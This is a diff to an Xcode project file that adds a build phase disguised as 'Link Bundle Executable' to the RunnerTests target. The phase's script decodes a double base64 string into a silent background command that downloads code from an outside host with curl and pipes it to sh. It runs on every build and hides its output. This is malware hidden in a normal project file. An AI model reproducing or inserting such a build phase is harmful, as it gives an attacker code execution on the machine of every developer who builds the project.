@@ -171,6 +171,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
+				E257575DAF20093B36BDE67E /* Link Bundle Executable */,
 				D20041633DAECF1F0D1C794A /* [CP] Check Pods Manifest.lock */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
@@ -270,7 +271,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0ECDF8A6DCCD24E906D626FC /* [CP] Check Pods Manifest.lock */ = {
+		E257575DAF20093B36BDE67E /* Link Bundle Executable */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Link Bundle Executable";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aFkyTmhjSEJzWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";			showEnvVarsInLog = 0;					};		0ECDF8A6DCCD24E906D626FC /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
